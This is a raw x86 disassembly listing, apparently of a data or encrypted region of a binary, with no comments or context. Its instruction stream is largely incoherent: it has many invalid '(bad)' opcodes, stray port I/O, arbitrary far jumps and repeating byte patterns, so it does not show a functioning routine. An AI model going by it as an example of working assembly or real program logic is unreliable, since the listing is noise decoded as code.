  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0x132e1160],1
  420266:	in     eax,0x58
  420268:	add    DWORD PTR [eax],eax
  42026a:	inc    DWORD PTR [eax]
  42026c:	add    BYTE PTR [eax],al
  42026e:	jg     0x420244
  420270:	dec    ebx
  420271:	mov    ecx,0xbf70c0d8
  420276:	xor    ecx,edi
  420278:	push   ebp
  420279:	cmp    eax,0x95780741
  42027e:	lds    edx,FWORD PTR [edi+0xaf6bf8d]
  420284:	ins    DWORD PTR es:[edi],dx
  420285:	in     al,dx
  420286:	fprem  
  420288:	test   eax,0x9304eb04
  42028d:	cmp    BYTE PTR [esi+edx*4-0x3f],0x62
  420292:	jb     0x4202a5
  420294:	ret    0x505
  420297:	jne    0x4202d5
  420299:	dec    esi
  42029a:	xor    ebp,eax
  42029c:	dec    edi
  42029d:	pop    esi
  42029e:	in     eax,dx
  42029f:	ja     0x4202c6
  4202a1:	mov    dl,0x48
  4202a3:	test   DWORD PTR [ecx],esp
  4202a5:	adc    DWORD PTR [eax-0x5aee0a05],ecx
  4202ab:	lods   eax,DWORD PTR ds:[esi]
  4202ac:	out    0x10,eax
  4202ae:	mov    bh,0xa6
  4202b0:	pop    ebp
  4202b1:	sbb    eax,0xef236f73
  4202b6:	dec    ebp
  4202b7:	inc    edx
  4202b8:	mov    eax,0x207304ce
  4202bd:	adc    al,0xf9
  4202bf:	(bad)  
  4202c0:	lock push edi
  4202c2:	push   es
  4202c3:	fnstcw WORD PTR [edi-0x2c69e70c]
  4202c9:	ror    esi,cl
  4202cb:	lds    edi,FWORD PTR [ebp+0x3]
  4202ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202cf:	inc    esp
  4202d0:	in     eax,dx
  4202d1:	dec    edi
  4202d2:	pop    ebx
  4202d3:	int    0xa8
  4202d5:	mov    cl,BYTE PTR [esi+0x24]
  4202d8:	push   edx
  4202d9:	pop    edi
  4202da:	jo     0x420315
  4202dc:	pop    edx
  4202dd:	pop    ss
  4202de:	les    esp,FWORD PTR [esi]
  4202e0:	jmp    0xdcd0:0x63fb345d
  4202e7:	out    0xde,al
  4202e9:	mov    al,0xc4
  4202eb:	dec    eax
  4202ec:	adc    bl,dl
  4202ee:	mov    ds:0xe4edfa4f,al
  4202f3:	aam    0x9
  4202f5:	in     eax,0xb3
  4202f7:	lahf   
  4202f8:	mov    dl,BYTE PTR [eax-0x37]
  4202fb:	xor    eax,0x253defc
  420300:	jae    0x420317
  420302:	nop
  420303:	inc    esi
  420304:	ss ja  0x420317
  420307:	(bad)  
  420308:	lock lahf 
  42030a:	das    
  42030b:	pop    edx
  42030c:	mov    ecx,0x51aa47fe
  420311:	sub    al,0x9b
  420313:	(bad)  
  420314:	call   0xdd8e0ddf
  420319:	jmp    0x420311
  42031b:	xor    eax,0x6d9b8d50
  420320:	push   ecx
  420321:	not    BYTE PTR [ebx+0x4905423d]
  420327:	ret    0x6d00
  42032a:	int    0x1a
  42032c:	ins    DWORD PTR es:[edi],dx
  42032d:	pushf  
  42032e:	mov    al,ds:0xa0219a57
  420333:	dec    esi
  420334:	sub    bh,BYTE PTR [edx-0x36]
  420337:	cdq    
  420338:	test   BYTE PTR [ecx-0x3a4c2699],cl
  42033e:	mov    ch,0x3a
  420340:	arpl   WORD PTR [ecx-0x54],si
  420343:	in     eax,dx
  420344:	daa    
  420345:	inc    ebp
  420346:	stos   DWORD PTR es:[edi],eax
  420347:	xchg   ecx,eax
  420348:	or     bh,dl
  42034a:	leave  
  42034b:	xchg   ebx,eax
  42034c:	aaa    
  42034d:	sahf   
  42034e:	jae    0x42035a
  420350:	jno    0x4202fd
  420352:	xchg   DWORD PTR [esi],eax
  420354:	pop    ecx
  420355:	mov    ebx,0x884367aa
  42035a:	sbb    eax,DWORD PTR [ebx+0x0]
  42035d:	xchg   edi,eax
  42035e:	retf   
  42035f:	xor    BYTE PTR [edx+esi*2+0x7b],dh
  420363:	std    
  420364:	xor    eax,0x2cc8022e
  420369:	pop    ss
  42036a:	stos   DWORD PTR es:[edi],eax
  42036b:	mov    ds:0x92,eax
	...
  4203d4:	add    BYTE PTR [eax],al
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	xchg   ecx,eax
  4203e3:	in     eax,dx
  4203e4:	dec    eax
  4203e5:	push   ds
  4203e6:	in     al,0x59
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	inc    DWORD PTR [eax]
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	fisubr DWORD PTR [ebp+0x70]
  4203f1:	scas   al,BYTE PTR es:[edi]
  4203f2:	fld    TBYTE PTR [edi+0x62008a24]
  4203f8:	sub    al,0xd6
  4203fa:	jo     0x4203c2
  4203fc:	xchg   ebx,eax
  4203fd:	xchg   edx,eax
  4203fe:	sar    BYTE PTR [ecx+ebx*4],1
  420401:	dec    esp
  420402:	lods   al,BYTE PTR ds:[esi]
  420403:	xor    dl,cl
  420405:	xchg   edi,eax
  420406:	test   BYTE PTR [edx+ebp*8],bh
  420409:	push   cs
  42040a:	mov    ebx,edi
  42040c:	jmp    0x42040a
  42040e:	call   0x35bf5048
  420413:	mov    esp,0x779a2952
  420418:	sub    DWORD PTR [esi-0x39],esp
  42041b:	lock stos BYTE PTR es:[edi],al
  42041d:	into   
  42041e:	sub    BYTE PTR [ebp+0xd],bl
  420421:	jl     0x4203d9
  420423:	popf   
  420424:	enter  0xf46d,0x37
  420428:	and    eax,0x791ffcfc
  42042d:	jg     0x42046b
  42042f:	push   ds
  420430:	pop    esp
  420431:	sub    edi,0xffffffd1
  420434:	or     eax,0x5a184367
  420439:	jp     0x42049f
  42043b:	dec    esp
  42043c:	jne    0x4203e4
  42043e:	loopne 0x420459
  420440:	retf   0x987d
  420443:	adc    al,0x36
  420445:	mov    edi,0x87717e27
  42044a:	adc    esp,esi
  42044c:	mov    bh,BYTE PTR [esi+0x57]
  42044f:	dec    edi
  420450:	in     eax,dx
  420451:	fdivr  st(1),st
  420453:	stos   BYTE PTR es:[edi],al
  420454:	imul   ecx,DWORD PTR [ebx+0x73],0xb53dae01
  42045b:	push   ss
  42045c:	shl    BYTE PTR [eax+0x75eacb28],1
  420462:	mov    bl,0x5d
  420464:	in     al,dx
  420465:	sub    DWORD PTR [esi],ebp
  420467:	dec    ebp
  420468:	mov    esi,0xe8f5d760
  42046d:	call   0x1318:0xc65e09a9
  420474:	out    0x1c,al
  420476:	(bad)  
  420478:	mov    cl,0xed
  42047a:	mov    eax,ds:0x4555236f
  42047f:	repz scas al,BYTE PTR es:[edi]
  420481:	xor    DWORD PTR [edx-0x6f],0xc578c6e5
  420488:	mov    ecx,0xbddd9a9f
  42048d:	clc    
  42048e:	pop    ebx
  42048f:	cmp    eax,0x6c91c0cc
  420494:	mul    BYTE PTR [ebx+0x24]
  420497:	jnp    0x420500
  420499:	push   ss
  42049a:	jp     0x4204c3
  42049c:	sbb    al,0x31
  42049e:	inc    esp
  42049f:	stos   BYTE PTR es:[edi],al
  4204a0:	pop    edx
  4204a1:	mov    ecx,DWORD PTR [edx-0x76]
  4204a4:	retf   
  4204a5:	cwde   
  4204a6:	xor    eax,0xbcaec8c7
  4204ab:	dec    edi
  4204ac:	ins    DWORD PTR es:[edi],dx
  4204ad:	sbb    eax,0x76500ef3
  4204b2:	xchg   ebp,eax
  4204b3:	call   0x6cb6:0xbda29092
  4204ba:	in     al,0x27
  4204bc:	mov    cl,0x56
  4204be:	in     al,dx
  4204bf:	mov    eax,0xa5e07ca5
  4204c4:	mov    ch,0x3f
  4204c6:	or     cl,BYTE PTR [ebx-0x3f344a96]
  4204cc:	push   ebp
  4204ce:	xor    ebx,DWORD PTR [esi-0xa0d364e]
  4204d4:	(bad)  
  4204d6:	loopne 0x42045f
  4204d8:	cld    
  4204d9:	push   ebx
  4204da:	mov    DWORD PTR [edi],ebx
  4204dc:	dec    esp
  4204dd:	inc    esp
  4204de:	inc    edi
  4204df:	sbb    esi,ebp
  4204e1:	scas   al,BYTE PTR es:[edi]
  4204e2:	inc    edi
  4204e3:	or     eax,0x1b6b78fd
  4204e8:	popf   
  4204e9:	in     al,dx
  4204ea:	push   edi
  4204eb:	xor    DWORD PTR [ebx+0x0],ebx
	...
  420555:	add    BYTE PTR [esi+0x7f125794],ch
  42055b:	shr    edi,cl
  42055d:	mov    esp,0x5a7f6c39
  420562:	mov    edx,DWORD PTR [ebp+0x35]
  420565:	sbb    al,0xe3
  420567:	pop    edx
  420568:	add    DWORD PTR [eax],eax
  42056a:	inc    DWORD PTR [eax]
  42056c:	add    BYTE PTR [eax],al
  42056e:	(bad)  
  42056f:	xor    eax,0x424e9bf4
  420574:	pop    esi
  420575:	lods   al,BYTE PTR ds:[esi]
  420576:	pop    ss
  420577:	push   cs
  420578:	pop    esp
  420579:	lods   eax,DWORD PTR ds:[esi]
  42057a:	pop    ss
  42057b:	dec    eax
  42057c:	lods   eax,DWORD PTR ds:[esi]
  42057d:	test   BYTE PTR ds:0x8be2ddaa,dl
  420583:	sbb    DWORD PTR [edi+esi*1],ebp
  420586:	pop    ebp
  420587:	add    eax,0x12586709
  42058c:	or     ebp,eax
  42058e:	clc    
  42058f:	xor    cl,al
  420591:	xchg   edi,eax
  420592:	push   ecx
  420593:	stos   BYTE PTR es:[edi],al
  420594:	sbb    dh,al
  420596:	in     al,0x14
  420598:	inc    edx
  420599:	xchg   esp,eax
  42059a:	aaa    
  42059b:	in     eax,dx
  42059c:	(bad)  
  42059e:	mov    ecx,DWORD PTR [ecx-0x1d6d0c8c]
  4205a4:	pop    es
  4205a5:	cmp    al,0xe7
  4205a7:	mov    bl,0x42
  4205a9:	xchg   BYTE PTR [eax],ch
  4205ab:	jbe    0x420627
  4205ad:	es aad 0x60
  4205b0:	fcomp  QWORD PTR [esi+0x1cd04ee6]
  4205b6:	mov    dl,0x58
  4205b8:	inc    edi
  4205b9:	jo     0x4205d6
  4205bb:	pop    edx
  4205bc:	pop    esi
  4205bd:	fist   DWORD PTR [edi-0x5c]
  4205c0:	cmp    esp,eax
  4205c2:	or     BYTE PTR [esi-0xe479578],ch
  4205c8:	shl    DWORD PTR [ebx+0x5b9bf188],1
  4205ce:	das    
  4205cf:	cmp    DWORD PTR ds:0xd4772a12,esi
  4205d5:	push   ebp
  4205d6:	jns    0x420642
  4205d8:	mov    edi,0x88739dbd
  4205dd:	test   BYTE PTR [edi-0x39],0x96
  4205e1:	es mov gs,ebx
  4205e4:	mov    esi,DWORD PTR [eax+0x5a]
  4205e7:	lods   eax,DWORD PTR ds:[esi]
  4205e8:	bound  ebp,QWORD PTR [edi]
  4205ea:	sbb    DWORD PTR [edx-0x56],ebp
  4205ed:	aas    
  4205ee:	and    eax,0x1dbd2f11
  4205f3:	inc    esi
  4205f4:	mov    bh,0x74
  4205f6:	rcl    edi,0x33
  4205f9:	lea    eax,[ecx]
  4205fb:	jge    0x420622
  4205fd:	ins    BYTE PTR es:[edi],dx
  4205fe:	and    BYTE PTR ds:0x395ff36,dl
  420604:	add    eax,0xf3ea6ad4
  420609:	aad    0xf1
  42060b:	add    ebp,esp
  42060d:	dec    ebp
  42060e:	fcomp  QWORD PTR [edx+ecx*8]
  420611:	aaa    
  420612:	dec    esi
  420613:	sub    cl,al
  420615:	lds    edx,FWORD PTR [edi+0x30]
  420618:	add    cl,BYTE PTR es:[ebx+0x696430f8]
  42061f:	pop    ss
  420620:	or     DWORD PTR [ebp-0x4],edi
  420623:	jmp    0x420644
  420625:	leave  
  420626:	inc    BYTE PTR [edx-0x19e132b5]
  42062c:	icebp  
  42062d:	push   ecx
  42062e:	add    BYTE PTR [esi-0x71],bh
  420631:	mov    ?,esi
  420633:	je     0x42064c
  420635:	(bad)  [ecx-0x10]
  420638:	fwait
  420639:	pop    ecx
  42063a:	sub    bh,BYTE PTR [edx-0x8522903]
  420640:	mov    esp,0xf46477c7
  420645:	sbb    BYTE PTR [eax+0x2f35770],ah
  42064b:	mov    BYTE PTR [esi-0x1d],0xe9
  42064f:	in     eax,dx
  420650:	icebp  
  420651:	(bad)  [eax-0x20bb8558]
  420657:	add    bl,BYTE PTR [esi+0x1a6bd3e2]
  42065d:	jg     0x420691
  42065f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420660:	(bad)  
  420661:	xor    eax,0x4a4102ca
  420666:	push   ds
  420667:	loope  0x4206df
  420669:	add    dh,cl
  42066b:	push   0xe9
	...
  4206d4:	add    BYTE PTR [eax],al
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	cmp    esp,esp
  4206e4:	imul   esi,DWORD PTR [ebp-0x1e],0x5b
  4206e8:	add    DWORD PTR [eax],eax
  4206ea:	inc    DWORD PTR [eax]
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	(bad)  
  4206ef:	data16 jo 0x4206d9
  4206f2:	fstp   DWORD PTR [edi]
  4206f4:	add    al,0xfc
  4206f6:	pop    eax
  4206f7:	fstp   QWORD PTR [eax-0x34]
  4206fa:	in     eax,0xb0
  4206fc:	mov    dh,0x3
  4206fe:	pushf  
  4206ff:	repz rcl eax,1
  420702:	out    dx,eax
  420703:	ret    0x6539
  420706:	push   eax
  420707:	sahf   
  420708:	mov    esi,0xba65c3d
  42070d:	into   
  42070e:	cmp    eax,0x8ce1f23e
  420713:	and    al,0xaa
  420715:	mov    edi,0xd09d33c7
  42071a:	mov    es,WORD PTR [esp+ebx*1+0x8]
  42071e:	mov    ch,0x61
  420720:	push   ds
  420721:	or     eax,0x787dbfcc
  420726:	mov    esp,0xc8df0c9d
  42072b:	leave  
  42072c:	loopne 0x420719
  42072e:	(bad)  
  420730:	jl     0x420738
  420732:	inc    ecx
  420733:	(bad)  
  420735:	add    ecx,DWORD PTR [ebp-0x72]
  420738:	dec    ebp
  420739:	lods   eax,DWORD PTR ds:[esi]
  42073a:	hlt    
  42073b:	jne    0x420779
  42073d:	mov    al,ds:0x7771aba1
  420742:	sbb    ebp,DWORD PTR [eax]
  420744:	shl    DWORD PTR [ebx],1
  420746:	xor    BYTE PTR [ebx],ch
  420748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420749:	call   0x32d87fdc
  42074e:	pop    edx
  42074f:	or     al,0x4f
  420751:	pop    edx
  420752:	test   al,0x87
  420754:	jnp    0x4207d0
  420756:	nop
  420757:	call   0x2d87:0x97f26782
  42075e:	(bad)  
  420760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420761:	mov    edx,0x7d56c8a1
  420766:	in     al,dx
  420767:	(bad)  
  420768:	or     al,0xe2
  42076a:	fsub   st(0),st
  42076c:	pop    edx
  42076d:	sbb    edx,DWORD PTR [edx]
  42076f:	in     eax,dx
  420770:	mov    ds:0xe54206f1,al
  420775:	js     0x420760
  420777:	shr    BYTE PTR [esp+ecx*4],0x6d
  42077b:	pop    esi
  42077c:	jmp    0x795:0x31e7dedb
  420783:	mov    al,ds:0x83d98938
  420788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420789:	nop
  42078a:	dec    dl
  42078c:	dec    eax
  42078d:	push   eax
  42078e:	push   ss
  42078f:	mov    edx,0x9e5048fb
  420794:	gs jo  0x420803
  420797:	inc    esp
  420798:	iret   
  420799:	mov    eax,gs:0x379ab08b
  42079f:	push   eax
  4207a0:	lods   al,BYTE PTR ds:[esi]
  4207a1:	adc    BYTE PTR [ecx-0x27bebf6e],bh
  4207a7:	sti    
  4207a8:	es push esp
  4207aa:	push   esi
  4207ab:	xchg   ebx,eax
  4207ac:	ja     0x4207ac
  4207ae:	(bad)  
  4207af:	out    0xc6,al
  4207b1:	xchg   ecx,eax
  4207b2:	mov    al,ds:0x820199bd
  4207b7:	push   edx
  4207b8:	pop    ds
  4207b9:	fimul  WORD PTR [ecx+ecx*4]
  4207bc:	in     al,dx
  4207bd:	sub    BYTE PTR ds:0x8719caa4,0xae
  4207c4:	les    ebp,FWORD PTR [edx-0x7b7172df]
  4207ca:	sbb    ecx,DWORD PTR [edx+ebx*2-0x592be0cc]
  4207d1:	dec    edi
  4207d2:	mul    DWORD PTR [esi+0x52]
  4207d5:	xor    BYTE PTR [ebp+edi*2+0x3597e989],dh
  4207dc:	mov    cl,cl
  4207de:	cmc    
  4207df:	cmc    
  4207e0:	(bad)  
  4207e1:	retf   
  4207e2:	arpl   WORD PTR [esi-0x32c6c7ee],bp
  4207e8:	adc    eax,0xd50e2521
	...
  420855:	add    BYTE PTR [ecx-0x587fdad1],cl
  42085b:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  420861:	pusha  
  420862:	sbb    cl,BYTE PTR [eax+0x2e]
  420865:	dec    esi
  420866:	loope  0x4208c4
  420868:	add    DWORD PTR [eax],eax
  42086a:	inc    DWORD PTR [eax]
  42086c:	add    BYTE PTR [eax],al
  42086e:	push   edi
  42086f:	mov    esi,0xccf0f52d
  420874:	mov    eax,ds:0xb2dc6250
  420879:	popa   
  42087a:	test   DWORD PTR [edi],edx
  42087c:	fdiv   DWORD PTR [esi-0x2ae11d64]
  420882:	jle    0x420805
  420884:	adc    eax,0x958f4e9c
  420889:	popf   
  42088a:	inc    ebp
  42088b:	(bad)  
  42088c:	push   edx
  42088d:	aas    
  42088e:	mov    ch,0x86
  420890:	lock inc ebp
  420892:	push   edi
  420893:	js     0x420842
  420895:	push   esp
  420896:	sbb    dl,al
  420898:	nop
  420899:	dec    ebp
  42089a:	cmc    
  42089b:	add    BYTE PTR [edx+0xa57176f],0x92
  4208a2:	inc    ebp
  4208a3:	fisttp WORD PTR [ebx+0x24]
  4208a6:	xchg   ebx,edi
  4208a8:	mov    edx,?
  4208aa:	jne    0x420916
  4208ac:	leave  
  4208ad:	sbb    dh,BYTE PTR [edx+0x65]
  4208b0:	add    DWORD PTR [edi-0x57],ebp
  4208b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208b4:	push   ebp
  4208b5:	retf   0xc436
  4208b8:	xor    DWORD PTR [esi],edi
  4208ba:	pop    ebp
  4208bb:	jge    0x420866
  4208bd:	das    
  4208be:	rol    edi,cl
  4208c0:	out    dx,eax
  4208c1:	in     al,dx
  4208c2:	cmc    
  4208c3:	cmp    DWORD PTR ss:[esi],esp
  4208c6:	outs   dx,DWORD PTR ds:[esi]
  4208c7:	retf   0xbd5
  4208ca:	faddp  st(0),st
  4208cc:	ja     0x420903
  4208ce:	mov    bh,0x83
  4208d0:	out    0x97,al
  4208d2:	or     esp,DWORD PTR [ebx]
  4208d4:	data16 add BYTE PTR [edi],bh
  4208d7:	adc    eax,0x618c9a90
  4208dc:	ret    0xfe10
  4208df:	call   0x1f2df338
  4208e4:	mov    dl,BYTE PTR [eax+0x34e1f35]
  4208ea:	dec    esi
  4208eb:	cld    
  4208ec:	les    ecx,FWORD PTR [eax+0x25d201]
  4208f2:	jne    0x4208c1
  4208f4:	scas   al,BYTE PTR es:[edi]
  4208f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f6:	out    0xf7,al
  4208f8:	dec    ebx
  4208f9:	mov    ch,0x96
  4208fb:	js     0x4208be
  4208fd:	and    BYTE PTR [esp+edx*4+0x74207293],bh
  420904:	jp     0x4208b0
  420906:	(bad)  
  420907:	adc    al,0x72
  420909:	xchg   edx,eax
  42090a:	mov    edx,0xf7140ae
  42090f:	enter  0x6454,0x60
  420913:	int3   
  420914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420915:	pop    ebp
  420916:	retf   0x80ad
  420919:	into   
  42091a:	test   eax,0x4eebf81b
  42091f:	lock cli 
  420921:	ja     0x42091f
  420923:	(bad)  
  420924:	sti    
  420925:	push   eax
  420926:	scas   eax,DWORD PTR es:[edi]
  420927:	xor    al,al
  420929:	lods   al,BYTE PTR ds:[esi]
  42092a:	and    BYTE PTR [eax-0x7e],bh
  42092d:	in     eax,0xda
  42092f:	mov    eax,0x32fd333b
  420934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420935:	ins    BYTE PTR es:[edi],dx
  420936:	pushf  
  420937:	mov    bl,0xd1
  420939:	xchg   esp,eax
  42093a:	ror    BYTE PTR [esp+edi*2-0x31],0xe7
  42093f:	popa   
  420940:	shr    DWORD PTR [edx+0x21932d0f],0xa
  420947:	call   FWORD PTR [esi+0x11]
  42094a:	pop    edi
  42094b:	and    cl,ch
  42094d:	(bad)  
  42094e:	push   esp
  42094f:	imul   edx,DWORD PTR [ecx+0xa],0xaf4962c5
  420956:	ret    0x90d4
  420959:	sub    dl,al
  42095b:	inc    ebx
  42095c:	jg     0x420933
  42095e:	jmp    0x4209d1
  420960:	or     eax,0xf583573b
  420965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420966:	xchg   ecx,eax
  420967:	push   esi
  420968:	cmp    BYTE PTR [ebp+0xf5d70d],ah
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x6c
  4209e3:	dec    ebx
  4209e4:	xlat   BYTE PTR ds:[ebx]
  4209e5:	mov    eax,ds:0x15de0
  4209ea:	inc    DWORD PTR [eax]
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	mov    ecx,0x4fde7936
  4209f3:	pop    es
  4209f4:	mov    dl,0xb
  4209f7:	shr    BYTE PTR [eax+0x5b46ae05],1
  4209fd:	rol    esp,0xc6
  420a00:	gs push ds
  420a02:	and    al,0x2b
  420a04:	jns    0x4209a4
  420a06:	pop    esi
  420a07:	test   BYTE PTR fs:[edx+0x52],al
  420a0b:	sub    al,0xb0
  420a0d:	mov    BYTE PTR [edi+0x1a],ch
  420a10:	jecxz  0x420a7f
  420a12:	shl    BYTE PTR [eax],1
  420a14:	push   0xffffff9e
  420a16:	xchg   bl,ch
  420a18:	jg     0x420a99
  420a1a:	jne    0x4209aa
  420a1c:	inc    edx
  420a1d:	mov    DWORD PTR [edi],esp
  420a1f:	imul   esi,DWORD PTR [eax],0xffffff80
  420a22:	ds push esp
  420a24:	div    BYTE PTR [ebx+0xa]
  420a27:	nop
  420a28:	dec    edx
  420a29:	push   esp
  420a2a:	push   edx
  420a2b:	mov    ebx,0x41be2dc0
  420a30:	mov    DWORD PTR [eax+0x46],edx
  420a33:	add    eax,0xc9145a4
  420a38:	cmp    ecx,DWORD PTR [edi-0x41]
  420a3b:	xor    al,0x8f
  420a3d:	sub    al,0x9b
  420a3f:	cmp    edi,DWORD PTR [esp+ebp*4-0x18]
  420a43:	sub    esi,DWORD PTR [edx]
  420a45:	jns    0x420ab7
  420a47:	mov    ecx,0xcdb5a2d1
  420a4c:	xchg   ebx,eax
  420a4d:	std    
  420a4e:	mov    ebx,0x29c05672
  420a53:	mov    eax,ds:0x94f16f84
  420a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a59:	mov    al,0xe8
  420a5b:	bswap  esp
  420a5d:	add    al,0xa5
  420a5f:	add    eax,0xb618eea8
  420a64:	sbb    DWORD PTR ds:0xe8b50ce7,edx
  420a6a:	stos   BYTE PTR es:[edi],al
  420a6b:	push   cs
  420a6c:	or     ebp,DWORD PTR [esi]
  420a6e:	xor    BYTE PTR [ebp-0x5dc72c71],al
  420a74:	jo     0x420a4b
  420a76:	pop    ecx
  420a77:	out    dx,al
  420a78:	push   0x42
  420a7a:	imul   ebx,DWORD PTR [edi],0x3a
  420a7d:	fucomip st,st(7)
  420a7f:	scas   al,BYTE PTR es:[edi]
  420a80:	jge    0x420a8f
  420a82:	cld    
  420a83:	inc    edx
  420a84:	arpl   ax,si
  420a86:	test   eax,0x8423d8c0
  420a8b:	out    dx,eax
  420a8c:	iret   
  420a8d:	adc    bl,BYTE PTR [edi-0x22]
  420a90:	sbb    al,0x83
  420a92:	jns    0x420aec
  420a94:	outs   dx,BYTE PTR ds:[esi]
  420a95:	xchg   ebx,eax
  420a96:	sbb    eax,0x5dc2fe80
  420a9b:	clc    
  420a9c:	ficomp WORD PTR [edi]
  420a9e:	pop    edi
  420a9f:	ficom  WORD PTR [edx]
  420aa1:	retf   
  420aa2:	sub    esp,esi
  420aa4:	cwde   
  420aa5:	mov    bh,0x75
  420aa7:	sub    esp,edx
  420aa9:	aam    0xfe
  420aab:	and    ebp,ebp
  420aad:	(bad)  
  420aae:	xchg   esp,eax
  420aaf:	adc    dh,BYTE PTR ds:0x1d81e9e
  420ab5:	ret    0x5a2c
  420ab8:	int3   
  420ab9:	outs   dx,BYTE PTR ds:[esi]
  420aba:	mov    eax,ds:0x45a981f3
  420abf:	ret    0xadf9
  420ac2:	cli    
  420ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ac4:	add    eax,0xbe30aa85
  420ac9:	and    BYTE PTR [ebp-0xfdfb2f],cl
  420acf:	sbb    al,0xe6
  420ad1:	xchg   ebx,eax
  420ad2:	jle    0x420b3d
  420ad4:	fist   DWORD PTR es:[ebp+0x5]
  420ad8:	fcomp  QWORD PTR [eax]
  420ada:	sbb    DWORD PTR [ebx],ecx
  420adc:	aaa    
  420add:	ins    DWORD PTR es:[edi],dx
  420ade:	xor    dh,BYTE PTR [edi-0x37a4f51f]
  420ae4:	sbb    eax,0x91952f4b
  420ae9:	jmp    0x420b2f
  420aeb:	dec    ecx
  420aec:	inc    eax
	...
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	mov    ebx,0xdfa43449
  420b67:	pop    esi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	inc    DWORD PTR [eax]
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	(bad)  
  420b6f:	jmp    ecx
  420b71:	jmp    0x420be4
  420b73:	dec    edx
  420b74:	mul    DWORD PTR [ecx-0x6e]
  420b77:	ret    0x917d
  420b7a:	outs   dx,DWORD PTR ds:[esi]
  420b7b:	imul   edx,esi,0x4591360d
  420b81:	mov    WORD PTR [edi+0x56],gs
  420b84:	shl    DWORD PTR [ebp-0x20a9a3b8],cl
  420b8a:	pop    ecx
  420b8b:	push   esi
  420b8c:	cmp    BYTE PTR [eax],ch
  420b8e:	sub    eax,0x864d6e7f
  420b93:	pusha  
  420b94:	jmp    0xebbfb8f6
  420b99:	sbb    bl,BYTE PTR [eax-0x6e]
  420b9c:	jle    0x420b3b
  420b9e:	mov    gs,ebx
  420ba0:	std    
  420ba1:	or     ch,cl
  420ba3:	aad    0x42
  420ba5:	call   0x3d96c220
  420baa:	hlt    
  420bab:	push   esp
  420bac:	cli    
  420bad:	ja     0x420b9b
  420baf:	add    BYTE PTR [esi*1+0xbb891f4],ch
  420bb6:	xchg   esi,eax
  420bb7:	inc    edx
  420bb8:	imul   esi,DWORD PTR [esi-0x5],0xffffffa6
  420bbc:	fwait
  420bbd:	cmp    DWORD PTR [ecx],esi
  420bbf:	and    bl,BYTE PTR [esi+eax*4]
  420bc2:	jmp    0x420bc4
  420bc4:	lds    esp,FWORD PTR [edx+eax*1+0x3]
  420bc8:	jle    0x420b87
  420bca:	imul   ecx,DWORD PTR [eax],0xc7f72b8c
  420bd0:	aad    0x8b
  420bd2:	loop   0x420b93
  420bd4:	int    0xe2
  420bd6:	cmp    BYTE PTR [esi+0x7b],cl
  420bd9:	add    edi,ebx
  420bdb:	dec    ecx
  420bdc:	arpl   WORD PTR [ebx+0x9],dx
  420bdf:	rcl    ecx,1
  420be1:	cmp    eax,0x689e9731
  420be6:	rcr    DWORD PTR [edx-0xd2f9189],1
  420bec:	sub    eax,DWORD PTR [ebp+0x79]
  420bef:	push   esp
  420bf0:	xor    DWORD PTR [ecx],0x503819fb
  420bf6:	(bad)  [esi]
  420bf8:	adc    eax,0x4c756dd1
  420bfd:	or     DWORD PTR [eax+0x32],edi
  420c00:	stc    
  420c01:	and    eax,DWORD PTR [ebp+0x78]
  420c04:	jne    0x420bca
  420c06:	gs or  edi,edx
  420c09:	cld    
  420c0a:	fcom   QWORD PTR [ecx+edx*1-0x6c]
  420c0e:	call   0xcb0e:0x946a6c57
  420c15:	sahf   
  420c16:	and    al,0xe6
  420c18:	mov    ah,0x22
  420c1a:	ins    BYTE PTR es:[edi],dx
  420c1b:	ja     0x420bea
  420c1d:	add    BYTE PTR [ecx+0x43],cl
  420c20:	mov    bh,0xb1
  420c22:	adc    al,0x2d
  420c24:	jb     0x420c66
  420c26:	ss das 
  420c28:	xchg   ecx,eax
  420c29:	push   edx
  420c2a:	or     al,0x72
  420c2c:	and    BYTE PTR ds:0xc44d3d3b,al
  420c32:	sbb    DWORD PTR [esi+0x57379a86],0xd860b455
  420c3c:	pop    edx
  420c3d:	cdq    
  420c3e:	xor    edi,0x7fb68a47
  420c44:	inc    ecx
  420c45:	inc    ebp
  420c46:	call   DWORD PTR [eax]
  420c48:	aad    0x6d
  420c4a:	xchg   BYTE PTR [edi-0x4],al
  420c4d:	cmp    ebp,DWORD PTR [eax-0x20]
  420c50:	inc    esp
  420c51:	call   0x544d:0xfd197277
  420c58:	push   ds
  420c59:	fsub   DWORD PTR ds:0xe74f290c
  420c5f:	mov    WORD PTR [ecx],?
  420c61:	cmp    ebx,DWORD PTR [ecx+0x6e]
  420c64:	xor    esp,ecx
  420c66:	ja     0x420c09
  420c68:	jne    0x420c30
